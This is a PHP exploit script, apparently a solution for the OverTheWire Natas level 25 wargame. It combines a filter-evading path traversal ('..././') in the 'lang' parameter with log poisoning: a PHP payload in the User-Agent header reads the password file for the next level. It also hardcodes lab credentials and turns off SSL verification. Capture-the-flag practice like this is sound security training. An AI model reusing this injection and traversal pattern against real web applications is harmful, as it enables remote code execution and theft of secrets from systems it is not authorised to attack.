<?php
$url = "http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_qqkgms5ehb8negkg068l0mtgfg.log";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas25:O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=qqkgms5ehb8negkg068l0mtgfg");
curl_setopt($ch, CURLOPT_USERAGENT, '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>');
$output = curl_exec ($ch);
curl_close($ch);
echo $output;
?>